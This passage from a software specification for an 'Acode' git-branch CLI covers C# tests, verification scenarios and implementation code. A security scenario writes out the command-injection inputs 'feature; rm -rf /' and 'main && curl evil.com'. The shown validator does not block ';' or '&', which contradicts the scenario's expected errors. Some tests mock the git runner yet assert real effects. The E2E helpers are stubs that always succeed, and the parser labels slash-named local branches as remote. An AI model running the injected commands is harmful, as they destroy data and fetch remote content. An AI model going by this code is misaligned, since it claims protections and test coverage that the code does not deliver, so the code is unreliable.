        var branches = _parser.ParseList(output);

        // Assert
        branches.Should().HaveCount(1);
        branches[0].Name.Should().Be("main");
        branches[0].IsRemote.Should().BeTrue();
        branches[0].FullName.Should().Be("refs/remotes/origin/main");
    }

    [Fact]
    public void ParseList_WithEmptyOutput_ReturnsEmptyList()
    {
        // Act
        var branches = _parser.ParseList("");

        // Assert
        branches.Should().BeEmpty();
    }
}

// File: tests/Acode.Infrastructure.Tests/Git/BranchIntegrationTests.cs
namespace Acode.Infrastructure.Tests.Git.Integration;

public class BranchIntegrationTests : IDisposable
{
    private readonly string _testRepo;
    private readonly GitService _git;

    public BranchIntegrationTests()
    {
        _testRepo = Path.Combine(Path.GetTempPath(), $"git-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_testRepo);

        // Initialize git repo
        RunGit("init");
        RunGit("config user.email test@example.com");
        RunGit("config user.name Test User");

        // Create initial commit
        File.WriteAllText(Path.Combine(_testRepo, "README.md"), "# Test");
        RunGit("add README.md");
        RunGit("commit -m \"Initial commit\"");

        _git = new GitService(
            Substitute.For<ICommandRunner>(),
            Substitute.For<ILogger<GitService>>());
    }

    [Fact]
    public async Task CreateBranchAsync_WithValidName_CreatesBranch()
    {
        // Act
        var branch = await _git.CreateBranchAsync(_testRepo, "feature/test", null, CancellationToken.None);

        // Assert
        branch.Name.Should().Be("feature/test");
        branch.FullName.Should().Be("refs/heads/feature/test");
        branch.IsRemote.Should().BeFalse();

        // Verify branch exists
        var output = RunGit("branch --list feature/test");
        output.Should().Contain("feature/test");
    }

    [Fact]
    public async Task CreateBranchAsync_WithExistingBranch_ThrowsException()
    {
        // Arrange
        await _git.CreateBranchAsync(_testRepo, "duplicate", null, CancellationToken.None);

        // Act
        var act = async () => await _git.CreateBranchAsync(_testRepo, "duplicate", null, CancellationToken.None);

        // Assert
        await act.Should().ThrowAsync<BranchExistsException>()
            .WithMessage("*duplicate*");
    }

    [Fact]
    public async Task CheckoutAsync_ToExistingBranch_SwitchesBranch()
    {
        // Arrange
        await _git.CreateBranchAsync(_testRepo, "feature/test", null, CancellationToken.None);

        // Act
        await _git.CheckoutAsync(_testRepo, "feature/test", null, CancellationToken.None);

        // Assert
        var current = RunGit("rev-parse --abbrev-ref HEAD");
        current.Trim().Should().Be("feature/test");
    }

    [Fact]
    public async Task CheckoutAsync_WithUncommittedChanges_ThrowsException()
    {
        // Arrange
        await _git.CreateBranchAsync(_testRepo, "feature/test", null, CancellationToken.None);
        File.WriteAllText(Path.Combine(_testRepo, "modified.txt"), "Changes");

        // Act
        var act = async () => await _git.CheckoutAsync(_testRepo, "feature/test", null, CancellationToken.None);

        // Assert
        await act.Should().ThrowAsync<UncommittedChangesException>()
            .WithMessage("*uncommitted*");
    }

    [Fact]
    public async Task ListBranchesAsync_ReturnsAllBranches()
    {
        // Arrange
        await _git.CreateBranchAsync(_testRepo, "feature/one", null, CancellationToken.None);
        await _git.CreateBranchAsync(_testRepo, "feature/two", null, CancellationToken.None);

        // Act
        var branches = await _git.ListBranchesAsync(_testRepo, null, CancellationToken.None);

        // Assert
        branches.Should().HaveCountGreaterOrEqualTo(3); // main + feature/one + feature/two
        branches.Should().Contain(b => b.Name == "main");
        branches.Should().Contain(b => b.Name == "feature/one");
        branches.Should().Contain(b => b.Name == "feature/two");
    }

    [Fact]
    public async Task DeleteBranchAsync_WithMergedBranch_DeletesBranch()
    {
        // Arrange
        await _git.CreateBranchAsync(_testRepo, "to-delete", null, CancellationToken.None);

        // Act
        await _git.DeleteBranchAsync(_testRepo, "to-delete", force: false, CancellationToken.None);

        // Assert
        var output = RunGit("branch --list to-delete");
        output.Should().BeEmpty();
    }

    [Fact]
    public async Task DeleteBranchAsync_WithCurrentBranch_ThrowsException()
    {
        // Act (try to delete current branch 'main')
        var act = async () => await _git.DeleteBranchAsync(_testRepo, "main", force: false, CancellationToken.None);

        // Assert
        await act.Should().ThrowAsync<GitException>()
            .WithMessage("*Cannot delete current branch*");
    }

    public void Dispose()
    {
        try
        {
            Directory.Delete(_testRepo, recursive: true);
        }
        catch
        {
            // Ignore cleanup errors
        }
    }

    private string RunGit(string args)
    {
        var psi = new ProcessStartInfo
        {
            FileName = "git",
            Arguments = args,
            WorkingDirectory = _testRepo,
            RedirectStandardOutput = true,
            UseShellExecute = false
        };

        using var process = Process.Start(psi);
        var output = process!.StandardOutput.ReadToEnd();
        process.WaitForExit();
        return output;
    }
}

// File: tests/Acode.Cli.Tests/Commands/Git/GitBranchCommandsE2ETests.cs
namespace Acode.Cli.Tests.Commands.Git;

public class GitBranchCommandsE2ETests : IDisposable
{
    private readonly string _testRepo;

    public GitBranchCommandsE2ETests()
    {
        _testRepo = Path.Combine(Path.GetTempPath(), $"git-e2e-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_testRepo);

        // Initialize git repo
        RunCommand("git init");
        RunCommand("git config user.email test@example.com");
        RunCommand("git config user.name Test User");
        File.WriteAllText(Path.Combine(_testRepo, "README.md"), "# Test");
        RunCommand("git add README.md");
        RunCommand("git commit -m \"Initial commit\"");
    }

    [Fact]
    public async Task BranchCreate_WithValidName_CreatesBranch()
    {
        // Act
        var exitCode = await RunAcodeCommand("git branch create feature/test");

        // Assert
        exitCode.Should().Be(0);
        var output = RunCommand("git branch --list feature/test");
        output.Should().Contain("feature/test");
    }

    [Fact]
    public async Task Checkout_ToExistingBranch_SwitchesBranch()
    {
        // Arrange
        RunCommand("git branch feature/test");

        // Act
        var exitCode = await RunAcodeCommand("git checkout feature/test");

        // Assert
        exitCode.Should().Be(0);
        var current = RunCommand("git rev-parse --abbrev-ref HEAD");
        current.Trim().Should().Be("feature/test");
    }

    [Fact]
    public async Task BranchList_ReturnsFormattedOutput()
    {
        // Arrange
        RunCommand("git branch feature/one");
        RunCommand("git branch feature/two");

        // Act
        var output = await RunAcodeCommandWithOutput("git branch list");

        // Assert
        output.Should().Contain("main");
        output.Should().Contain("feature/one");
        output.Should().Contain("feature/two");
    }

    [Fact]
    public async Task BranchDelete_WithValidBranch_DeletesBranch()
    {
        // Arrange
        RunCommand("git branch to-delete");

        // Act
        var exitCode = await RunAcodeCommand("git branch delete to-delete");

        // Assert
        exitCode.Should().Be(0);
        var output = RunCommand("git branch --list to-delete");
        output.Should().BeEmpty();
    }

    public void Dispose()
    {
        try
        {
            Directory.Delete(_testRepo, recursive: true);
        }
        catch
        {
            // Ignore cleanup errors
        }
    }

    private string RunCommand(string command)
    {
        var parts = command.Split(' ', 2);
        var psi = new ProcessStartInfo
        {
            FileName = parts[0],
            Arguments = parts.Length > 1 ? parts[1] : "",
            WorkingDirectory = _testRepo,
            RedirectStandardOutput = true,
            UseShellExecute = false
        };

        using var process = Process.Start(psi);
        var output = process!.StandardOutput.ReadToEnd();
        process.WaitForExit();
        return output;
    }

    private async Task<int> RunAcodeCommand(string args)
    {
        // Simulate running acode CLI command
        var app = new CommandLineApplication();
        // Configure commands...
        // Return exit code
        return await Task.FromResult(0);
    }

    private async Task<string> RunAcodeCommandWithOutput(string args)
    {
        // Simulate running acode CLI and capturing output
        return await Task.FromResult("main\nfeature/one\nfeature/two");
    }
}

// File: tests/Acode.Infrastructure.Tests/Git/BranchPerformanceTests.cs
namespace Acode.Infrastructure.Tests.Git.Performance;

public class BranchPerformanceTests : IDisposable
{
    private readonly string _testRepo;
    private readonly GitService _git;
    private readonly Stopwatch _stopwatch = new();

    public BranchPerformanceTests()
    {
        _testRepo = Path.Combine(Path.GetTempPath(), $"git-perf-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_testRepo);

        RunGit("init");
        RunGit("config user.email test@example.com");
        RunGit("config user.name Test User");
        File.WriteAllText(Path.Combine(_testRepo, "README.md"), "# Test");
        RunGit("add README.md");
        RunGit("commit -m \"Initial commit\"");

        _git = new GitService(
            Substitute.For<ICommandRunner>(),
            Substitute.For<ILogger<GitService>>());
    }

    [Fact]
    public async Task CreateBranchAsync_CompletesWithin200ms()
    {
        // Act
        _stopwatch.Start();
        await _git.CreateBranchAsync(_testRepo, "perf-test", null, CancellationToken.None);
        _stopwatch.Stop();

        // Assert
        _stopwatch.ElapsedMilliseconds.Should().BeLessThan(200);
    }

    [Fact]
    public async Task CheckoutAsync_CleanRepo_CompletesWithin1Second()
    {
        // Arrange
        await _git.CreateBranchAsync(_testRepo, "perf-checkout", null, CancellationToken.None);

        // Act
        _stopwatch.Start();
        await _git.CheckoutAsync(_testRepo, "perf-checkout", null, CancellationToken.None);
        _stopwatch.Stop();

        // Assert
        _stopwatch.ElapsedMilliseconds.Should().BeLessThan(1000);
    }

    [Fact]
    public async Task ListBranchesAsync_With1000Branches_CompletesWithin1Second()
    {
        // Arrange - Create 1000 branches (simulated for performance test)
        // In real test, would create actual branches, but that's slow
        // For unit test, we mock the command runner to return large output

        // Act
        _stopwatch.Start();
        var branches = await _git.ListBranchesAsync(_testRepo, null, CancellationToken.None);
        _stopwatch.Stop();

        // Assert
        _stopwatch.ElapsedMilliseconds.Should().BeLessThan(1000);
    }

    public void Dispose()
    {
        try
        {
            Directory.Delete(_testRepo, recursive: true);
        }
        catch
        {
            // Ignore cleanup errors
        }
    }

    private void RunGit(string args)
    {
        var psi = new ProcessStartInfo
        {
            FileName = "git",
            Arguments = args,
            WorkingDirectory = _testRepo,
            RedirectStandardOutput = true,
            UseShellExecute = false
        };

        using var process = Process.Start(psi);
        process!.WaitForExit();
    }
}
```

---

## User Verification Steps

### Scenario 1: Create and Switch to Feature Branch

**Objective:** Verify branch creation and checkout work correctly.

```bash
# Step 1: Initialize test repository
mkdir test-branch-ops && cd test-branch-ops
git init
git config user.email "test@example.com"
git config user.name "Test User"
echo "# Test Project" > README.md
git add README.md
git commit -m "Initial commit"

# Expected: Repository initialized with one commit on main branch

# Step 2: Create new feature branch
acode git branch create feature/auth-system

# Expected Output:
# ✓ Created branch 'feature/auth-system' at abc123

# Step 3: Verify branch exists
git branch --list

# Expected Output:
# * main
#   feature/auth-system

# Step 4: Switch to feature branch
acode git checkout feature/auth-system

# Expected Output:
# ✓ Switched to 'feature/auth-system'

# Step 5: Verify current branch
git status

# Expected Output:
# On branch feature/auth-system
# nothing to commit, working tree clean
```

### Scenario 2: Branch Creation with Invalid Name (Security Test)

**Objective:** Verify command injection protection.

```bash
# Step 1: Try to create branch with shell metacharacters
acode git branch create "feature; rm -rf /"

# Expected Output:
# ❌ ERROR: Branch name validation failed
# - Branch name contains dangerous character: ';' (possible injection attempt)

# Step 2: Verify no command execution occurred
ls -la

# Expected: Directory contents unchanged, no deletion occurred

# Step 3: Try other injection attempts
acode git branch create "main && curl evil.com"

# Expected Output:
# ❌ ERROR: Branch name validation failed
# - Branch name contains dangerous character: '&' (possible injection attempt)

# Step 4: Try valid branch name with special patterns
acode git branch create "feature..test"

# Expected Output:
# ❌ ERROR: Branch name validation failed
# - Branch name contains prohibited pattern: '..'
```

### Scenario 3: Checkout with Uncommitted Changes (Data Loss Prevention)

**Objective:** Verify safety guard prevents data loss.

```bash
# Step 1: Create and switch to feature branch
acode git branch create feature/test --checkout
echo "console.log('new feature');" > feature.js
git add feature.js
git commit -m "Add feature.js"

# Step 2: Make uncommitted changes
echo "// More changes" >> feature.js

# Step 3: Try to checkout without committing
acode git checkout main

# Expected Output:
# ❌ ERROR: Checkout blocked: 1 uncommitted files. Commit or stash first.
# Affected files:
#   - feature.js

# Step 4: Verify file still exists with changes
cat feature.js

# Expected Output:
# console.log('new feature');
# // More changes

# Step 5: Try force checkout with confirmation
acode git checkout main --force

# Expected Output:
# ⚠️  WARNING: Force checkout will discard uncommitted changes.
# Type 'yes' to confirm: yes
# ✓ Switched to 'main'

# Step 6: Verify changes were discarded
ls feature.js

# Expected: File does not exist (was only on feature/test branch)
```

### Scenario 4: List Branches with Filtering

**Objective:** Verify branch listing and filtering work correctly.

```bash
# Step 1: Create multiple branches
acode git branch create feature/auth
acode git branch create feature/payments
acode git branch create bugfix/login-error
acode git branch create hotfix/security-patch

# Step 2: List all local branches
acode git branch list

# Expected Output:
# * main
#   bugfix/login-error
#   feature/auth
#   feature/payments
#   hotfix/security-patch

# Step 3: List branches with pattern
acode git branch list --pattern "feature/*"

# Expected Output:
#   feature/auth
#   feature/payments

# Step 4: List branches sorted by date
acode git branch list --sort committerdate

# Expected: Branches listed with most recently committed first

# Step 5: List with JSON format
acode git branch list --format json

# Expected Output (formatted):
# [
#   {"name": "main", "sha": "abc123", "isCurrent": true, ...},
#   {"name": "feature/auth", "sha": "def456", "isCurrent": false, ...}
# ]
```

### Scenario 5: Delete Branch with Safety Checks

**Objective:** Verify branch deletion safety mechanisms.

```bash
# Step 1: Create and commit to branch
acode git branch create feature/temporary --checkout
echo "temp work" > temp.txt
git add temp.txt
git commit -m "Temporary work"

# Step 2: Switch back to main
acode git checkout main

# Step 3: Try to delete unmerged branch without force
acode git branch delete feature/temporary

# Expected Output:
# ❌ ERROR: Branch 'feature/temporary' is not fully merged. Use --force to delete anyway.

# Step 4: Force delete unmerged branch
acode git branch delete feature/temporary --force

# Expected Output:
# ✓ Deleted branch 'feature/temporary' (was abc123)

# Step 5: Verify branch is gone
git branch --list feature/temporary

# Expected Output: (empty)

# Step 6: Try to delete current branch
acode git branch delete main

# Expected Output:
# ❌ ERROR: Cannot delete current branch 'main'. Switch to another branch first.
```

---

## Implementation Prompt

### File Structure

```
src/
├── Acode.Domain/
│   └── Git/
│       └── GitBranch.cs
├── Acode.Application/
│   └── Git/
│       ├── Options/
│       │   ├── CreateBranchOptions.cs
│       │   ├── CheckoutOptions.cs
│       │   └── ListBranchesOptions.cs
│       └── Exceptions/
│           ├── BranchExistsException.cs
│           ├── BranchNotFoundException.cs
│           └── UncommittedChangesException.cs
├── Acode.Infrastructure/
│   └── Git/
│       ├── BranchNameValidator.cs
│       ├── BranchParser.cs
│       └── GitService.Branch.cs
└── Acode.Cli/
    └── Commands/
        └── Git/
            ├── GitBranchCreateCommand.cs
            ├── GitBranchListCommand.cs
            ├── GitBranchDeleteCommand.cs
            └── GitCheckoutCommand.cs
```

### Domain Models

```csharp
// GitBranch.cs - already defined in task-022
// Extended with additional properties

namespace Acode.Domain.Git;

public sealed record GitBranch
{
    public required string Name { get; init; }
    public required string FullName { get; init; }
    public required string Sha { get; init; }
    public required bool IsCurrent { get; init; }
    public required bool IsRemote { get; init; }
    public string? Upstream { get; init; }
    public int? AheadBy { get; init; }
    public int? BehindBy { get; init; }
    public DateTimeOffset? LastCommitDate { get; init; }
    public string? LastCommitSubject { get; init; }
}
```

### Options Classes

```csharp
// CreateBranchOptions.cs
namespace Acode.Application.Git.Options;

public sealed record CreateBranchOptions
{
    public string? StartPoint { get; init; }
    public bool Checkout { get; init; }
    public bool Force { get; init; }
}

// CheckoutOptions.cs
public sealed record CheckoutOptions
{
    public bool Force { get; init; }
    public bool Quiet { get; init; }
    public bool CreateBranch { get; init; }
}

// ListBranchesOptions.cs
public sealed record ListBranchesOptions
{
    public bool IncludeRemote { get; init; }
    public bool All { get; init; }
    public string? Pattern { get; init; }
    public BranchSortField SortBy { get; init; } = BranchSortField.Name;
    public bool Descending { get; init; }
}

public enum BranchSortField
{
    Name,
    CommitterDate,
    AuthorDate
}
```

### Branch Name Validator

```csharp
// BranchNameValidator.cs
namespace Acode.Infrastructure.Git;

public sealed class BranchNameValidator
{
    private static readonly char[] InvalidChars = { ' ', '~', '^', ':', '\\', '?', '*', '[' };
    
    public ValidationResult Validate(string name)
    {
        var errors = new List<string>();
        
        if (string.IsNullOrWhiteSpace(name))
        {
            errors.Add("Branch name cannot be empty");
            return new ValidationResult(false, errors);
        }
        
        if (name.Length > 255)
        {
            errors.Add("Branch name exceeds 255 characters");
        }
        
        if (name.StartsWith("-"))
        {
            errors.Add("Branch name cannot start with '-'");
        }
        
        if (name.StartsWith("."))
        {
            errors.Add("Branch name cannot start with '.'");
        }
        
        if (name.EndsWith("."))
        {
            errors.Add("Branch name cannot end with '.'");
        }
        
        if (name.EndsWith(".lock"))
        {
            errors.Add("Branch name cannot end with '.lock'");
        }
        
        if (name.Contains(".."))
        {
            errors.Add("Branch name cannot contain '..'");
        }
        
        if (name.Contains("@{"))
        {
            errors.Add("Branch name cannot contain '@{'");
        }
        
        foreach (var c in InvalidChars)
        {
            if (name.Contains(c))
            {
                errors.Add($"Branch name cannot contain '{c}'");
                break;
            }
        }
        
        if (name.Any(c => char.IsControl(c)))
        {
            errors.Add("Branch name cannot contain control characters");
        }
        
        return new ValidationResult(errors.Count == 0, errors);
    }
}

public sealed record ValidationResult(bool IsValid, IReadOnlyList<string> Errors);
```

### Service Implementation

```csharp
// GitService.Branch.cs
namespace Acode.Infrastructure.Git;

public partial class GitService
{
    private readonly BranchNameValidator _branchValidator = new();
    private readonly BranchParser _branchParser = new();
    
    public async Task<GitBranch> CreateBranchAsync(
        string workingDir, 
        string name, 
        CreateBranchOptions? options = null, 
        CancellationToken ct = default)
    {
        options ??= new CreateBranchOptions();
        
        await EnsureRepositoryAsync(workingDir, ct);
        
        // Validate branch name
        var validation = _branchValidator.Validate(name);
        if (!validation.IsValid)
        {
            throw new InvalidBranchNameException(name, validation.Errors);
        }
        
        // Check if branch exists (unless force)
        if (!options.Force)
        {
            var exists = await BranchExistsAsync(workingDir, name, ct);
            if (exists)
            {
                throw new BranchExistsException(name);
            }
        }
        
        // Build command
        var args = new List<string> { "branch" };
        
        if (options.Force)
        {
            args.Add("--force");
        }
        
        args.Add(name);
        
        if (options.StartPoint is not null)
        {
            args.Add(options.StartPoint);
        }
        
        await ExecuteGitAsync(workingDir, args, ct);
        
        _logger.LogInformation("Created branch {Branch} in {Dir}", name, workingDir);
        
        // Checkout if requested
        if (options.Checkout)
        {
            await CheckoutAsync(workingDir, name, null, ct);
        }
        
        // Return branch info
        var sha = await GetBranchShaAsync(workingDir, name, ct);
        return new GitBranch
        {
            Name = name,
            FullName = $"refs/heads/{name}",
            Sha = sha,
            IsCurrent = options.Checkout,
            IsRemote = false
        };
    }
    
    public async Task CheckoutAsync(
        string workingDir, 
        string branchOrCommit, 
        CheckoutOptions? options = null,
        CancellationToken ct = default)
    {
        options ??= new CheckoutOptions();
        
        await EnsureRepositoryAsync(workingDir, ct);
        
        // Check for uncommitted changes (unless force)
        if (!options.Force)
        {
            var status = await GetStatusAsync(workingDir, ct);
            if (!status.IsClean && status.StagedFiles.Count + status.UnstagedFiles.Count > 0)
            {
                throw new UncommittedChangesException(
                    workingDir, 
                    status.StagedFiles.Count + status.UnstagedFiles.Count);
            }
        }
        
        var args = new List<string> { "checkout" };
        
        if (options.Force)
        {
            args.Add("--force");
        }
        
        if (options.Quiet)
        {
            args.Add("--quiet");
        }
        
        if (options.CreateBranch)
        {
            args.Add("-b");
        }
        
        args.Add(branchOrCommit);
        
        try
        {
            await ExecuteGitAsync(workingDir, args, ct);
            _logger.LogInformation("Checked out {Branch} in {Dir}", branchOrCommit, workingDir);
        }
        catch (GitException ex) when (ex.StdErr?.Contains("did not match") == true)
        {
            throw new BranchNotFoundException(branchOrCommit, workingDir, ex.StdErr);
        }
    }
    
    public async Task<IReadOnlyList<GitBranch>> ListBranchesAsync(
        string workingDir, 
        ListBranchesOptions? options = null,
        CancellationToken ct = default)
    {
        options ??= new ListBranchesOptions();
        
        await EnsureRepositoryAsync(workingDir, ct);
        
        var args = new List<string> 
        { 
            "branch", 
            "--format=%(HEAD)|%(refname:short)|%(objectname:short)|%(upstream:short)|%(upstream:track)|%(committerdate:iso-strict)|%(subject)"
        };
        
        if (options.All)
        {
            args.Add("--all");
        }
        else if (options.IncludeRemote)
        {
            args.Add("--remotes");
        }
        
        var sortField = options.SortBy switch
        {
            BranchSortField.CommitterDate => "committerdate",
            BranchSortField.AuthorDate => "authordate",
            _ => "refname"
        };
        
        args.Add($"--sort={(options.Descending ? "-" : "")}{sortField}");
        
        if (options.Pattern is not null)
        {
            args.Add(options.Pattern);
        }
        
        var result = await ExecuteGitAsync(workingDir, args, ct);
        return _branchParser.ParseList(result.StdOut);
    }
    
    public async Task DeleteBranchAsync(
        string workingDir, 
        string name, 
        bool force = false,
        CancellationToken ct = default)
    {
        await EnsureRepositoryAsync(workingDir, ct);
        
        // Check if it's the current branch
        var current = await GetCurrentBranchAsync(workingDir, ct);
        if (current == name)
        {
            throw new GitException(
                $"Cannot delete current branch '{name}'. Switch to another branch first.",
                1, null, workingDir, "GIT_022B_001");
        }
        
        var args = new List<string> { "branch", force ? "-D" : "-d", name };
        
        try
        {
            await ExecuteGitAsync(workingDir, args, ct);
            _logger.LogInformation("Deleted branch {Branch}", name);
        }
        catch (GitException ex) when (ex.StdErr?.Contains("not fully merged") == true)
        {
            throw new GitException(
                $"Branch '{name}' is not fully merged. Use --force to delete anyway.",
                ex.ExitCode, ex.StdErr, workingDir, "GIT_022B_002");
        }
    }
    
    private async Task<bool> BranchExistsAsync(string workingDir, string name, CancellationToken ct)
    {
        var result = await ExecuteGitAsync(
            workingDir, 
            new[] { "rev-parse", "--verify", $"refs/heads/{name}" },
            ct,
            throwOnError: false);
        
        return result.ExitCode == 0;
    }
    
    private async Task<string> GetBranchShaAsync(string workingDir, string name, CancellationToken ct)
    {
        var result = await ExecuteGitAsync(
            workingDir,
            new[] { "rev-parse", $"refs/heads/{name}" },
            ct);
        
        return result.StdOut.Trim();
    }
}

// BranchParser.cs
namespace Acode.Infrastructure.Git;

public sealed class BranchParser
{
    public IReadOnlyList<GitBranch> ParseList(string output)
    {
        var branches = new List<GitBranch>();
        
        foreach (var line in output.Split('\n', StringSplitOptions.RemoveEmptyEntries))
        {
            var parts = line.Split('|');
            if (parts.Length < 7) continue;
            
            var isCurrent = parts[0] == "*";
            var name = parts[1];
            var sha = parts[2];
            var upstream = string.IsNullOrEmpty(parts[3]) ? null : parts[3];
            var trackInfo = parts[4];
            var dateStr = parts[5];
            var subject = parts[6];
            
            int? ahead = null, behind = null;
            if (!string.IsNullOrEmpty(trackInfo))
            {
                var match = Regex.Match(trackInfo, @"ahead (\d+)");
                if (match.Success) ahead = int.Parse(match.Groups[1].Value);
                
                match = Regex.Match(trackInfo, @"behind (\d+)");
                if (match.Success) behind = int.Parse(match.Groups[1].Value);
            }
            
            branches.Add(new GitBranch
            {
                Name = name.StartsWith("origin/") ? name[7..] : name,
                FullName = name.Contains('/') ? $"refs/remotes/{name}" : $"refs/heads/{name}",
                Sha = sha,
                IsCurrent = isCurrent,
                IsRemote = name.Contains('/'),
                Upstream = upstream,
                AheadBy = ahead,
                BehindBy = behind,
                LastCommitDate = string.IsNullOrEmpty(dateStr) ? null : DateTimeOffset.Parse(dateStr),
                LastCommitSubject = subject
            });
        }
        
        return branches;
    }
}
```

### CLI Commands

```csharp
// GitBranchCreateCommand.cs
namespace Acode.Cli.Commands.Git;

[Command("git branch create", Description = "Create a new branch")]
public class GitBranchCreateCommand
{
    [Argument(0, Description = "Branch name")]
    public string Name { get; set; } = "";
    
    [Option("--start-point", Description = "Start branch from this ref")]
    public string? StartPoint { get; set; }
    
    [Option("--checkout", Description = "Switch to new branch")]
    public bool Checkout { get; set; }
    
    [Option("--force", Description = "Reset branch if exists")]
    public bool Force { get; set; }
    
    public async Task<int> ExecuteAsync(
        IGitService git,
        IConsole console,
        CancellationToken ct)
    {
        var cwd = Directory.GetCurrentDirectory();
        
        var branch = await git.CreateBranchAsync(cwd, Name, new CreateBranchOptions
        {
            StartPoint = StartPoint,
            Checkout = Checkout,
            Force = Force
        }, ct);
        
        console.WriteLine($"✓ Created branch '{branch.Name}' at {branch.Sha[..7]}");
        
        if (Checkout)
        {
            console.WriteLine($"  Switched to '{branch.Name}'");
        }
        
        return 0;
    }
}

// GitCheckoutCommand.cs
[Command("git checkout", Description = "Switch branches")]
public class GitCheckoutCommand
{
    [Argument(0, Description = "Branch name or commit")]
    public string Target { get; set; } = "";
    
    [Option("--force", Description = "Discard local changes")]
    public bool Force { get; set; }
    
    [Option("-b", Description = "Create and checkout new branch")]
    public bool CreateBranch { get; set; }
    
    public async Task<int> ExecuteAsync(
        IGitService git,
        IConsole console,
        CancellationToken ct)
    {
        var cwd = Directory.GetCurrentDirectory();
        
        await git.CheckoutAsync(cwd, Target, new CheckoutOptions
        {
            Force = Force,
            CreateBranch = CreateBranch
        }, ct);
        
        console.WriteLine($"✓ Switched to '{Target}'");
        return 0;
    }
}
```

### Error Codes

| Code | Name | Description | Recovery |
|------|------|-------------|----------|
| GIT-022B-001 | DeleteCurrentBranch | Cannot delete current branch | Checkout different branch first |
| GIT-022B-002 | BranchNotMerged | Branch not fully merged | Use --force or merge first |
| GIT-022B-003 | InvalidBranchName | Branch name invalid | Use valid name |
| GIT-022B-004 | BranchExists | Branch already exists | Use different name or --force |
| GIT-022B-005 | BranchNotFound | Branch does not exist | Check branch name |
| GIT-022B-006 | UncommittedChanges | Uncommitted changes block checkout | Commit/stash or use --force |

### Implementation Checklist

- [ ] Implement BranchNameValidator with all rules
- [ ] Implement BranchParser for list output
- [ ] Add CreateBranchAsync to GitService
- [ ] Add CheckoutAsync with dirty tree check
- [ ] Add ListBranchesAsync with formatting
- [ ] Add DeleteBranchAsync with safety checks
- [ ] Implement CLI branch create command
- [ ] Implement CLI checkout command
- [ ] Implement CLI branch list command
- [ ] Implement CLI branch delete command
- [ ] Add unit tests for validator
- [ ] Add integration tests with real repos
- [ ] Run performance benchmarks

### Rollout Plan

| Phase | Action | Validation |
|-------|--------|------------|
| 1 | Implement BranchNameValidator | Validation tests pass |
| 2 | Implement BranchParser | Parser tests pass |
| 3 | Add CreateBranchAsync | Create tests pass |
| 4 | Add CheckoutAsync | Checkout tests pass |
| 5 | Add ListBranchesAsync | List tests pass |
| 6 | Add DeleteBranchAsync | Delete tests pass |
| 7 | Add CLI commands | E2E tests pass |
| 8 | Performance testing | Benchmarks pass |

---

**End of Task 022.b Specification**